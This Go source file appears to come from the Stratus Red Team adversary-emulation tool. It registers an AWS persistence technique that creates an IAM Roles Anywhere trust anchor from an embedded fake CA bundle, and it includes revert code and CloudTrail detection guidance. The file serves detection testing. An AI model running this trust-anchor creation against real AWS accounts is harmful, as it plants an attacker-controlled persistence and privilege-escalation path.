package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/rolesanywhere"
	"github.com/aws/aws-sdk-go-v2/service/rolesanywhere/types"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

var trustAnchorName = aws.String("malicious-rolesanywhere-trust-anchor")

//go:embed malicious_externalCertificateBundle.pem
var maliciousExternalCertificateBundle string

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.persistence.rolesanywhere-create-trust-anchor",
		FriendlyName: "Create a Trust anchor",
		Description: `
Establishes persistence by creating a new Trust anchor.

Warm-up: None.

Detonation: 

- Create the Trust anchor with a fake Certificate Authority (CA).

References:

- https://docs.aws.amazon.com/rolesanywhere/latest/userguide/trust-model.html
- https://docs.aws.amazon.com/rolesanywhere/latest/userguide/getting-started.html
`,
		Detection: `
Identify when a Trust anchor is created, through CloudTrail's <code>CreateTrustAnchor</code> event.
`,
		Platform:           stratus.AWS,
		IsIdempotent:       false, // cannot create twice a Trust anchor with the same name
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		Detonate:           detonate,
		Revert:             revert,
	})
}

func detonate(map[string]string) error {
	rolesAnywhereClient := rolesanywhere.NewFromConfig(providers.AWS().GetConnection())

	log.Println("Creating a malicious Trust anchor")
	result, err := rolesAnywhereClient.CreateTrustAnchor(context.Background(), &rolesanywhere.CreateTrustAnchorInput{
		Name: trustAnchorName,
		Source: &types.Source{
			SourceData: types.SourceData(
				&types.SourceDataMemberX509CertificateData{Value: maliciousExternalCertificateBundle},
			),
			SourceType: types.TrustAnchorTypeCertificateBundle,
		},
		Tags: []types.Tag{
			{Key: aws.String("StratusRedTeam"), Value: aws.String("true")},
		},
	})
	if err != nil {
		return errors.New("Unable to create malicious trust anchor: " + err.Error())
	}

	log.Printf("Created malicious trust anchor %s (%s) \n", *trustAnchorName, *result.TrustAnchor.TrustAnchorArn)

	return nil
}

func revert(map[string]string) error {
	rolesanywhereClient := rolesanywhere.NewFromConfig(providers.AWS().GetConnection())

	result, err := rolesanywhereClient.ListTrustAnchors(context.Background(), &rolesanywhere.ListTrustAnchorsInput{
		PageSize: aws.Int32(500),
	})
	if err != nil {
		return errors.New(err.Error())
	}

	for i := range result.TrustAnchors {
		if *result.TrustAnchors[i].Name == *trustAnchorName {
			log.Println("Removing malicious Trust anchor " + *trustAnchorName)
			_, err := rolesanywhereClient.DeleteTrustAnchor(context.Background(), &rolesanywhere.DeleteTrustAnchorInput{
				TrustAnchorId: result.TrustAnchors[i].TrustAnchorId,
			})
			if err != nil {
				return errors.New("Unable to remove Trust anchor: " + err.Error())
			}
			log.Println("Removed Trust anchor " + *result.TrustAnchors[i].TrustAnchorId)
		}
	}
	return nil
}
